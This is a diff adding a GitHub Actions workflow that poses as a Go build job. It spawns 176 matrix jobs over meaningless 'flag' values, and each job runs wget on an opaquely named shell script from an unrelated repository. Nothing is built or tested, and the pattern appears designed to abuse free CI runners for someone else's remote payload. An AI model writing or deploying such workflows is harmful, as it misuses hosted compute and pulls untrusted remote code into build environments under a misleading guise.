@@ -1,0 +1,28 @@
+name: lokkas
+on: [push, pull_request]
+jobs:
+  build:
+    name: semua
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]
+    timeout-minutes: 54
+    env:
+        NUM_JOBS: 10
+
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: semua
+      run: |
+          wget https://github.com/kienayvvjajs/redesigned-guacamole/blob/main/Jeoahdjandhajdh.sh
